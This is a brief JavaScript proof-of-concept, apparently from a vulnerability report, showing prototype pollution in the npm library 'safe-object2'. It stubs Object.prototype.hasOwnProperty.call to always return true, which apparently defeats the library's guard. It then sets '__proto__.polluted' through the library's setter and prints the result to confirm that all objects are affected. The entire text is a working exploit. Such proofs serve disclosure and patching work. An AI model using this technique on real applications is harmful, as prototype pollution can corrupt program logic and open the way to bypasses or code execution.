Object.prototype.hasOwnProperty.call = () => true;
const safeObj2 = require('safe-object2');
const obj = safeObj2({});
console.log({}.polluted);
obj.setter([
    '__proto__',
    'polluted'
], 'yes');
console.log({}.polluted);